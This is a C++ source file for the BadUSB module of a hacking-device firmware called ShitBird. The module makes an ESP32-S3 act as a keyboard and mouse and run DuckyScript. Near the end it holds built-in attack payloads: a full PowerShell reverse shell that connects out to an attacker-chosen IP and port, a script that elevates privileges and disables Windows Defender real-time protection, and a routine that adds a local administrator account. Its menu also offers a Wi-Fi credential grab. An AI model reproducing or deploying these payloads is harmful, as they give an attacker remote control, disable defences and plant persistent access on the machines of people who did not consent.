/**
 * ShitBird Firmware - BadUSB Module Implementation
 */

#include "badusb_module.h"
#include "../../core/system.h"
#include "../../core/storage.h"
#include "../../ui/ui_manager.h"

// Static member initialization
USBHIDKeyboard* BadUSBModule::keyboard = nullptr;
USBHIDMouse* BadUSBModule::mouse = nullptr;

bool BadUSBModule::initialized = false;
bool BadUSBModule::enabled = false;
BadUSBState BadUSBModule::state = BadUSBState::IDLE;
KeyboardLayout BadUSBModule::currentLayout = KeyboardLayout::US;

std::vector<DuckyLine> BadUSBModule::currentScript;
std::vector<PayloadInfo> BadUSBModule::payloads;
int BadUSBModule::currentLine = 0;
int BadUSBModule::defaultDelay = 0;
DuckyLine BadUSBModule::lastCommand;

TaskHandle_t BadUSBModule::payloadTaskHandle = nullptr;

void BadUSBModule::init() {
    if (initialized) return;

    Serial.println("[BADUSB] Initializing...");

    // Initialize USB HID
    keyboard = new USBHIDKeyboard();
    mouse = new USBHIDMouse();

    USB.begin();
    keyboard->begin();
    mouse->begin();

    // Load payloads from SD
    loadPayloadsFromSD();

    initialized = true;
    Serial.println("[BADUSB] Initialized");
}

void BadUSBModule::update() {
    if (!initialized) return;

    // Check USB connection status
    // ESP32-S3 USB is always "connected" when plugged in
}

void BadUSBModule::deinit() {
    if (!initialized) return;

    stopPayload();
    disable();

    delete keyboard;
    delete mouse;
    keyboard = nullptr;
    mouse = nullptr;

    initialized = false;
}

// ============================================================================
// USB HID Control
// ============================================================================

bool BadUSBModule::isConnected() {
    // ESP32-S3 USB is connected when USB is active
    return initialized && enabled;
}

void BadUSBModule::enable() {
    if (!initialized) return;
    enabled = true;
    state = BadUSBState::CONNECTED;
    Serial.println("[BADUSB] Enabled");
}

void BadUSBModule::disable() {
    enabled = false;
    state = BadUSBState::IDLE;
    Serial.println("[BADUSB] Disabled");
}

// ============================================================================
// Keyboard Operations
// ============================================================================

void BadUSBModule::typeString(const String& str) {
    if (!enabled || !keyboard) return;

    for (size_t i = 0; i < str.length(); i++) {
        char c = str[i];

        // Handle special characters
        if (c == '\n') {
            keyboard->write(KEY_RETURN);
        } else if (c == '\t') {
            keyboard->write(KEY_TAB);
        } else {
            // Convert character based on layout
            char converted = convertToLayout(c, currentLayout);
            keyboard->write(converted);
        }

        delay(10);  // Small delay between keystrokes
    }
}

void BadUSBModule::typeChar(char c) {
    if (!enabled || !keyboard) return;
    keyboard->write(c);
}

void BadUSBModule::pressKey(uint8_t key, uint8_t modifiers) {
    if (!enabled || !keyboard) return;

    if (modifiers & HIDKey::MOD_CTRL) keyboard->press(KEY_LEFT_CTRL);
    if (modifiers & HIDKey::MOD_SHIFT) keyboard->press(KEY_LEFT_SHIFT);
    if (modifiers & HIDKey::MOD_ALT) keyboard->press(KEY_LEFT_ALT);
    if (modifiers & HIDKey::MOD_GUI) keyboard->press(KEY_LEFT_GUI);

    keyboard->press(key);
    delay(50);
    keyboard->releaseAll();
}

void BadUSBModule::releaseKey(uint8_t key) {
    if (!enabled || !keyboard) return;
    keyboard->release(key);
}

void BadUSBModule::releaseAll() {
    if (!enabled || !keyboard) return;
    keyboard->releaseAll();
}

void BadUSBModule::setLayout(KeyboardLayout layout) {
    currentLayout = layout;
    Serial.printf("[BADUSB] Layout set to: %d\n", (int)layout);
}

// ============================================================================
// Mouse Operations
// ============================================================================

void BadUSBModule::mouseMove(int8_t x, int8_t y) {
    if (!enabled || !mouse) return;
    mouse->move(x, y);
}

void BadUSBModule::mouseClick(uint8_t button) {
    if (!enabled || !mouse) return;

    switch (button) {
        case 1: mouse->click(MOUSE_LEFT); break;
        case 2: mouse->click(MOUSE_RIGHT); break;
        case 3: mouse->click(MOUSE_MIDDLE); break;
    }
}

void BadUSBModule::mouseDoubleClick() {
    if (!enabled || !mouse) return;
    mouse->click(MOUSE_LEFT);
    delay(50);
    mouse->click(MOUSE_LEFT);
}

void BadUSBModule::mouseScroll(int8_t delta) {
    if (!enabled || !mouse) return;
    mouse->move(0, 0, delta);
}

void BadUSBModule::mouseDrag(int8_t x, int8_t y) {
    if (!enabled || !mouse) return;
    mouse->press(MOUSE_LEFT);
    mouse->move(x, y);
    mouse->release(MOUSE_LEFT);
}

// ============================================================================
// DuckyScript Parsing
// ============================================================================

bool BadUSBModule::loadPayload(const String& filename) {
    String path = String(PATH_PAYLOADS) + "/" + filename;
    String content = Storage::readFile(path.c_str());

    if (content.isEmpty()) {
        Serial.printf("[BADUSB] Failed to load: %s\n", filename.c_str());
        return false;
    }

    return parseScript(content);
}

bool BadUSBModule::parseScript(const String& script) {
    currentScript.clear();
    currentLine = 0;
    defaultDelay = 0;

    // Split into lines
    int start = 0;
    int end = script.indexOf('\n');

    while (start < script.length()) {
        String line;
        if (end == -1) {
            line = script.substring(start);
            start = script.length();
        } else {
            line = script.substring(start, end);
            start = end + 1;
            end = script.indexOf('\n', start);
        }

        line.trim();

        if (line.length() > 0) {
            DuckyLine parsed = parseLine(line);
            if (parsed.command != DuckyCommand::NONE) {
                currentScript.push_back(parsed);
            }
        }
    }

    Serial.printf("[BADUSB] Parsed %d commands\n", currentScript.size());
    return !currentScript.empty();
}

DuckyLine BadUSBModule::parseLine(const String& line) {
    DuckyLine result;
    result.command = DuckyCommand::NONE;

    // Skip empty lines and comments
    if (line.length() == 0 || line.startsWith("//")) {
        return result;
    }

    // Find command and argument
    int spacePos = line.indexOf(' ');
    String cmd, arg;

    if (spacePos == -1) {
        cmd = line;
        arg = "";
    } else {
        cmd = line.substring(0, spacePos);
        arg = line.substring(spacePos + 1);
    }

    cmd.toUpperCase();

    // Check for modifier combinations (e.g., "CTRL ALT DELETE")
    if (cmd == "CTRL" || cmd == "CONTROL" || cmd == "SHIFT" ||
        cmd == "ALT" || cmd == "GUI" || cmd == "WINDOWS") {

        // Parse modifier chain
        String remaining = line;
        while (remaining.length() > 0) {
            spacePos = remaining.indexOf(' ');
            String part;

            if (spacePos == -1) {
                part = remaining;
                remaining = "";
            } else {
                part = remaining.substring(0, spacePos);
                remaining = remaining.substring(spacePos + 1);
            }

            part.toUpperCase();

            if (part == "CTRL" || part == "CONTROL") {
                result.modifiers.push_back(HIDKey::MOD_CTRL);
            } else if (part == "SHIFT") {
                result.modifiers.push_back(HIDKey::MOD_SHIFT);
            } else if (part == "ALT") {
                result.modifiers.push_back(HIDKey::MOD_ALT);
            } else if (part == "GUI" || part == "WINDOWS") {
                result.modifiers.push_back(HIDKey::MOD_GUI);
            } else {
                // Final key
                result.command = stringToCommand(part);
                if (result.command == DuckyCommand::NONE) {
                    // It's a character key
                    result.argument = part;
                    result.command = DuckyCommand::STRING;
                }
                break;
            }
        }

        if (result.command == DuckyCommand::NONE && !result.modifiers.empty()) {
            // Just modifiers pressed
            result.command = DuckyCommand::GUI;  // Default action
        }

        return result;
    }

    result.command = stringToCommand(cmd);
    result.argument = arg;

    return result;
}

DuckyCommand BadUSBModule::stringToCommand(const String& str) {
    if (str == "REM") return DuckyCommand::REM;
    if (str == "DELAY") return DuckyCommand::DELAY;
    if (str == "STRING") return DuckyCommand::STRING;
    if (str == "STRINGLN") return DuckyCommand::STRINGLN;
    if (str == "GUI" || str == "WINDOWS") return DuckyCommand::GUI;
    if (str == "MENU" || str == "APP") return DuckyCommand::MENU;
    if (str == "SHIFT") return DuckyCommand::SHIFT;
    if (str == "ALT") return DuckyCommand::ALT;
    if (str == "CONTROL" || str == "CTRL") return DuckyCommand::CONTROL;
    if (str == "ENTER") return DuckyCommand::ENTER;
    if (str == "ESCAPE" || str == "ESC") return DuckyCommand::ESCAPE;
    if (str == "BACKSPACE") return DuckyCommand::BACKSPACE;
    if (str == "TAB") return DuckyCommand::TAB;
    if (str == "SPACE") return DuckyCommand::SPACE;
    if (str == "CAPSLOCK") return DuckyCommand::CAPSLOCK;
    if (str == "PRINTSCREEN") return DuckyCommand::PRINTSCREEN;
    if (str == "SCROLLLOCK") return DuckyCommand::SCROLLLOCK;
    if (str == "PAUSE") return DuckyCommand::PAUSE;
    if (str == "INSERT") return DuckyCommand::INSERT;
    if (str == "HOME") return DuckyCommand::HOME;
    if (str == "PAGEUP") return DuckyCommand::PAGEUP;
    if (str == "DELETE") return DuckyCommand::DELETE;
    if (str == "END") return DuckyCommand::END;
    if (str == "PAGEDOWN") return DuckyCommand::PAGEDOWN;
    if (str == "UP" || str == "UPARROW") return DuckyCommand::UP;
    if (str == "DOWN" || str == "DOWNARROW") return DuckyCommand::DOWN;
    if (str == "LEFT" || str == "LEFTARROW") return DuckyCommand::LEFT;
    if (str == "RIGHT" || str == "RIGHTARROW") return DuckyCommand::RIGHT;
    if (str == "F1") return DuckyCommand::F1;
    if (str == "F2") return DuckyCommand::F2;
    if (str == "F3") return DuckyCommand::F3;
    if (str == "F4") return DuckyCommand::F4;
    if (str == "F5") return DuckyCommand::F5;
    if (str == "F6") return DuckyCommand::F6;
    if (str == "F7") return DuckyCommand::F7;
    if (str == "F8") return DuckyCommand::F8;
    if (str == "F9") return DuckyCommand::F9;
    if (str == "F10") return DuckyCommand::F10;
    if (str == "F11") return DuckyCommand::F11;
    if (str == "F12") return DuckyCommand::F12;
    if (str == "REPEAT") return DuckyCommand::REPEAT;
    if (str == "DEFAULT_DELAY" || str == "DEFAULTDELAY") return DuckyCommand::DEFAULT_DELAY;
    if (str == "LED") return DuckyCommand::LED;

    return DuckyCommand::NONE;
}

uint8_t BadUSBModule::stringToKey(const String& str) {
    if (str == "ENTER") return KEY_RETURN;
    if (str == "ESCAPE" || str == "ESC") return KEY_ESC;
    if (str == "BACKSPACE") return KEY_BACKSPACE;
    if (str == "TAB") return KEY_TAB;
    if (str == "SPACE") return ' ';
    if (str == "CAPSLOCK") return KEY_CAPS_LOCK;
    if (str == "PRINTSCREEN") return HIDKey::PRINT_SCREEN;
    if (str == "SCROLLLOCK") return HIDKey::SCROLL_LOCK;
    if (str == "PAUSE") return HIDKey::PAUSE;
    if (str == "INSERT") return KEY_INSERT;
    if (str == "HOME") return KEY_HOME;
    if (str == "PAGEUP") return KEY_PAGE_UP;
    if (str == "DELETE") return KEY_DELETE;
    if (str == "END") return KEY_END;
    if (str == "PAGEDOWN") return KEY_PAGE_DOWN;
    if (str == "UP") return KEY_UP_ARROW;
    if (str == "DOWN") return KEY_DOWN_ARROW;
    if (str == "LEFT") return KEY_LEFT_ARROW;
    if (str == "RIGHT") return KEY_RIGHT_ARROW;
    if (str == "F1") return KEY_F1;
    if (str == "F2") return KEY_F2;
    if (str == "F3") return KEY_F3;
    if (str == "F4") return KEY_F4;
    if (str == "F5") return KEY_F5;
    if (str == "F6") return KEY_F6;
    if (str == "F7") return KEY_F7;
    if (str == "F8") return KEY_F8;
    if (str == "F9") return KEY_F9;
    if (str == "F10") return KEY_F10;
    if (str == "F11") return KEY_F11;
    if (str == "F12") return KEY_F12;
    if (str == "MENU") return HIDKey::MENU;

    // Single character
    if (str.length() == 1) {
        return str[0];
    }

    return 0;
}

// ============================================================================
// Payload Execution
// ============================================================================

void BadUSBModule::runPayload() {
    if (!enabled || currentScript.empty()) return;

    if (state == BadUSBState::RUNNING_PAYLOAD) {
        return;  // Already running
    }

    Serial.println("[BADUSB] Starting payload execution");
    state = BadUSBState::RUNNING_PAYLOAD;
    currentLine = 0;
    g_systemState.currentMode = OperationMode::BADUSB;

    xTaskCreatePinnedToCore(
        payloadTask,
        "BadUSB_Payload",
        8192,
        nullptr,
        2,
        &payloadTaskHandle,
        1
    );

    Storage::log("badusb", "Payload execution started");
}

void BadUSBModule::stopPayload() {
    if (state != BadUSBState::RUNNING_PAYLOAD &&
        state != BadUSBState::PAUSED) return;

    Serial.println("[BADUSB] Stopping payload");

    if (payloadTaskHandle) {
        vTaskDelete(payloadTaskHandle);
        payloadTaskHandle = nullptr;
    }

    releaseAll();
    state = BadUSBState::CONNECTED;

    if (g_systemState.currentMode == OperationMode::BADUSB) {
        g_systemState.currentMode = OperationMode::IDLE;
    }

    Storage::log("badusb", "Payload execution stopped");
}

void BadUSBModule::pausePayload() {
    if (state == BadUSBState::RUNNING_PAYLOAD) {
        state = BadUSBState::PAUSED;
    }
}

void BadUSBModule::resumePayload() {
    if (state == BadUSBState::PAUSED) {
        state = BadUSBState::RUNNING_PAYLOAD;
    }
}

bool BadUSBModule::isRunning() {
    return state == BadUSBState::RUNNING_PAYLOAD;
}

bool BadUSBModule::isPaused() {
    return state == BadUSBState::PAUSED;
}

float BadUSBModule::getProgress() {
    if (currentScript.empty()) return 0;
    return (float)currentLine / currentScript.size() * 100.0;
}

void BadUSBModule::payloadTask(void* param) {
    while (currentLine < currentScript.size() &&
           (state == BadUSBState::RUNNING_PAYLOAD ||
            state == BadUSBState::PAUSED)) {

        // Wait if paused
        while (state == BadUSBState::PAUSED) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }

        if (state != BadUSBState::RUNNING_PAYLOAD) break;

        executeCommand(currentScript[currentLine]);
        lastCommand = currentScript[currentLine];
        currentLine++;

        // Default delay between commands
        if (defaultDelay > 0) {
            vTaskDelay(pdMS_TO_TICKS(defaultDelay));
        }
    }

    Serial.println("[BADUSB] Payload execution complete");
    releaseAll();
    state = BadUSBState::CONNECTED;

    if (g_systemState.currentMode == OperationMode::BADUSB) {
        g_systemState.currentMode = OperationMode::IDLE;
    }

    vTaskDelete(nullptr);
}

void BadUSBModule::executeCommand(const DuckyLine& cmd) {
    // Calculate combined modifiers
    uint8_t mods = 0;
    for (uint8_t m : cmd.modifiers) {
        mods |= m;
    }

    switch (cmd.command) {
        case DuckyCommand::REM:
            // Comment - do nothing
            break;

        case DuckyCommand::DELAY:
            vTaskDelay(pdMS_TO_TICKS(cmd.argument.toInt()));
            break;

        case DuckyCommand::DEFAULT_DELAY:
            defaultDelay = cmd.argument.toInt();
            break;

        case DuckyCommand::STRING:
            typeString(cmd.argument);
            break;

        case DuckyCommand::STRINGLN:
            typeString(cmd.argument);
            keyboard->write(KEY_RETURN);
            break;

        case DuckyCommand::GUI:
            pressKey(stringToKey(cmd.argument.length() > 0 ? cmd.argument : "r"),
                     mods | HIDKey::MOD_GUI);
            break;

        case DuckyCommand::MENU:
            pressKey(HIDKey::MENU, mods);
            break;

        case DuckyCommand::ENTER:
            pressKey(KEY_RETURN, mods);
            break;

        case DuckyCommand::ESCAPE:
            pressKey(KEY_ESC, mods);
            break;

        case DuckyCommand::BACKSPACE:
            pressKey(KEY_BACKSPACE, mods);
            break;

        case DuckyCommand::TAB:
            pressKey(KEY_TAB, mods);
            break;

        case DuckyCommand::SPACE:
            pressKey(' ', mods);
            break;

        case DuckyCommand::CAPSLOCK:
            pressKey(KEY_CAPS_LOCK, mods);
            break;

        case DuckyCommand::PRINTSCREEN:
            pressKey(HIDKey::PRINT_SCREEN, mods);
            break;

        case DuckyCommand::INSERT:
            pressKey(KEY_INSERT, mods);
            break;

        case DuckyCommand::HOME:
            pressKey(KEY_HOME, mods);
            break;

        case DuckyCommand::PAGEUP:
            pressKey(KEY_PAGE_UP, mods);
            break;

        case DuckyCommand::DELETE:
            pressKey(KEY_DELETE, mods);
            break;

        case DuckyCommand::END:
            pressKey(KEY_END, mods);
            break;

        case DuckyCommand::PAGEDOWN:
            pressKey(KEY_PAGE_DOWN, mods);
            break;

        case DuckyCommand::UP:
            pressKey(KEY_UP_ARROW, mods);
            break;

        case DuckyCommand::DOWN:
            pressKey(KEY_DOWN_ARROW, mods);
            break;

        case DuckyCommand::LEFT:
            pressKey(KEY_LEFT_ARROW, mods);
            break;

        case DuckyCommand::RIGHT:
            pressKey(KEY_RIGHT_ARROW, mods);
            break;

        case DuckyCommand::F1: pressKey(KEY_F1, mods); break;
        case DuckyCommand::F2: pressKey(KEY_F2, mods); break;
        case DuckyCommand::F3: pressKey(KEY_F3, mods); break;
        case DuckyCommand::F4: pressKey(KEY_F4, mods); break;
        case DuckyCommand::F5: pressKey(KEY_F5, mods); break;
        case DuckyCommand::F6: pressKey(KEY_F6, mods); break;
        case DuckyCommand::F7: pressKey(KEY_F7, mods); break;
        case DuckyCommand::F8: pressKey(KEY_F8, mods); break;
        case DuckyCommand::F9: pressKey(KEY_F9, mods); break;
        case DuckyCommand::F10: pressKey(KEY_F10, mods); break;
        case DuckyCommand::F11: pressKey(KEY_F11, mods); break;
        case DuckyCommand::F12: pressKey(KEY_F12, mods); break;

        case DuckyCommand::REPEAT:
            if (lastCommand.command != DuckyCommand::NONE) {
                int count = cmd.argument.toInt();
                if (count <= 0) count = 1;
                for (int i = 0; i < count; i++) {
                    executeCommand(lastCommand);
                }
            }
            break;

        case DuckyCommand::SHIFT:
            if (cmd.argument.length() > 0) {
                pressKey(stringToKey(cmd.argument), mods | HIDKey::MOD_SHIFT);
            }
            break;

        case DuckyCommand::ALT:
            if (cmd.argument.length() > 0) {
                pressKey(stringToKey(cmd.argument), mods | HIDKey::MOD_ALT);
            }
            break;

        case DuckyCommand::CONTROL:
            if (cmd.argument.length() > 0) {
                pressKey(stringToKey(cmd.argument), mods | HIDKey::MOD_CTRL);
            }
            break;

        default:
            break;
    }
}

// ============================================================================
// Payload Management
// ============================================================================

std::vector<PayloadInfo>& BadUSBModule::getPayloads() {
    return payloads;
}

void BadUSBModule::loadPayloadsFromSD() {
    payloads.clear();

    auto files = Storage::listFiles(PATH_PAYLOADS, ".txt");

    for (const String& filename : files) {
        PayloadInfo info;
        info.filename = filename;
        info.name = filename.substring(0, filename.lastIndexOf('.'));
        info.targetOS = "All";

        // Try to read description from first line (REM comment)
        String path = String(PATH_PAYLOADS) + "/" + filename;
        String content = Storage::readFile(path.c_str());
        if (content.startsWith("REM ")) {
            int newline = content.indexOf('\n');
            if (newline > 4) {
                info.description = content.substring(4, newline);
            }
        }

        payloads.push_back(info);
    }

    Serial.printf("[BADUSB] Loaded %d payloads from SD\n", payloads.size());
}

bool BadUSBModule::savePayload(const String& name, const String& script) {
    String path = String(PATH_PAYLOADS) + "/" + name + ".txt";
    bool result = Storage::writeFile(path.c_str(), script.c_str());

    if (result) {
        loadPayloadsFromSD();  // Refresh list
    }

    return result;
}

bool BadUSBModule::deletePayload(const String& name) {
    String path = String(PATH_PAYLOADS) + "/" + name + ".txt";
    bool result = Storage::remove(path.c_str());

    if (result) {
        loadPayloadsFromSD();
    }

    return result;
}

// ============================================================================
// Built-in Payloads
// ============================================================================

void BadUSBModule::runRickroll() {
    parseScript(BuiltInPayloads::RICKROLL);
    runPayload();
}

void BadUSBModule::runInfoGather() {
    parseScript(BuiltInPayloads::SYSINFO_WINDOWS);
    runPayload();
}

void BadUSBModule::runWiFiGrab() {
    parseScript(BuiltInPayloads::WIFI_GRAB_WINDOWS);
    runPayload();
}

void BadUSBModule::runReverseShell(const String& ip, uint16_t port) {
    String script = "GUI r\nDELAY 500\nSTRING powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('" +
                    ip + "'," + String(port) + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\nENTER";

    parseScript(script);
    runPayload();
}

void BadUSBModule::runDisableDefender() {
    String script = R"(
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb runAs"
ENTER
DELAY 2000
ALT y
DELAY 500
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500
STRING exit
ENTER
)";

    parseScript(script);
    runPayload();
}

void BadUSBModule::runAddUser(const String& username, const String& password) {
    String script = "GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING net user " +
                    username + " " + password + " /add\nENTER\nDELAY 500\nSTRING net localgroup administrators " +
                    username + " /add\nENTER\nDELAY 500\nSTRING exit\nENTER";

    parseScript(script);
    runPayload();
}

// ============================================================================
// Utility
// ============================================================================

uint8_t BadUSBModule::charToKeyCode(char c) {
    if (c >= 'a' && c <= 'z') return HIDKey::A + (c - 'a');
    if (c >= 'A' && c <= 'Z') return HIDKey::A + (c - 'A');
    if (c >= '1' && c <= '9') return HIDKey::NUM_1 + (c - '1');
    if (c == '0') return HIDKey::NUM_0;

    switch (c) {
        case ' ': return HIDKey::SPACE;
        case '\n': return HIDKey::ENTER;
        case '\t': return HIDKey::TAB;
        case '-': return HIDKey::MINUS;
        case '=': return HIDKey::EQUALS;
        case '[': return HIDKey::LEFT_BRACKET;
        case ']': return HIDKey::RIGHT_BRACKET;
        case '\\': return HIDKey::BACKSLASH;
        case ';': return HIDKey::SEMICOLON;
        case '\'': return HIDKey::APOSTROPHE;
        case '`': return HIDKey::GRAVE;
        case ',': return HIDKey::COMMA;
        case '.': return HIDKey::PERIOD;
        case '/': return HIDKey::SLASH;
    }

    return 0;
}

uint8_t BadUSBModule::getModifierForChar(char c) {
    if (c >= 'A' && c <= 'Z') return HIDKey::MOD_SHIFT;

    const char* shiftChars = "!@#$%^&*()_+{}|:\"<>?~";
    for (int i = 0; shiftChars[i]; i++) {
        if (c == shiftChars[i]) return HIDKey::MOD_SHIFT;
    }

    return 0;
}

char BadUSBModule::convertToLayout(char c, KeyboardLayout layout) {
    // TODO: Implement layout conversion for non-US keyboards
    return c;
}

// ============================================================================
// Menu Integration
// ============================================================================

void BadUSBModule::buildMenu(void* menuPtr) {
    MenuScreen* menu = static_cast<MenuScreen*>(menuPtr);

    menu->addItem(MenuItem("Enable USB HID", []() {
        BadUSBModule::enable();
        UIManager::showMessage("BadUSB", "USB HID Enabled");
    }));

    menu->addItem(MenuItem("Disable USB HID", []() {
        BadUSBModule::disable();
        UIManager::showMessage("BadUSB", "USB HID Disabled");
    }));

    menu->addItem(MenuItem("Rickroll", []() {
        if (!BadUSBModule::isConnected()) {
            UIManager::showMessage("Error", "Enable USB first");
            return;
        }
        BadUSBModule::runRickroll();
        UIManager::showMessage("BadUSB", "Rickroll running...");
    }));

    menu->addItem(MenuItem("WiFi Grab (Win)", []() {
        if (!BadUSBModule::isConnected()) {
            UIManager::showMessage("Error", "Enable USB first");
            return;
        }
        BadUSBModule::runWiFiGrab();
        UIManager::showMessage("BadUSB", "WiFi grab running...");
    }));

    menu->addItem(MenuItem("System Info (Win)", []() {
        if (!BadUSBModule::isConnected()) {
            UIManager::showMessage("Error", "Enable USB first");
            return;
        }
        BadUSBModule::runInfoGather();
        UIManager::showMessage("BadUSB", "Info gather running...");
    }));

    menu->addItem(MenuItem("Load Payloads", []() {
        BadUSBModule::loadPayloadsFromSD();
        auto& payloads = BadUSBModule::getPayloads();
        String msg = String(payloads.size()) + " payloads loaded";
        UIManager::showMessage("BadUSB", msg);
    }));

    menu->addItem(MenuItem("Stop Payload", []() {
        BadUSBModule::stopPayload();
    }));

    menu->addItem(MenuItem("< Back", nullptr));
    static_cast<MenuItem&>(menu->items.back()).type = MenuItemType::BACK;
}
